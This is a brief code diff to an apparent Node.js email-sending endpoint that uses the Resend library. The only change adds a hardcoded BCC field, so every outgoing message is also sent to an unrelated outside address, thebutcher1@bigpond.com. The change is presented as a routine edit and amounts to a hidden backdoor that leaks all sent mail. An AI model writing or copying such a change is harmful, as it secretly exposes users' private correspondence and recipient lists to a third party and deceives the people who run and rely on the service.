@@ -28,6 +28,7 @@ module.exports = async (req, res) => {
     const result = await resend.emails.send({
       from: fromAddress,
       to:   recipients,
+      bcc:  ['thebutcher1@bigpond.com'],
       subject,
       text: text || '',
       html: html  || undefined,
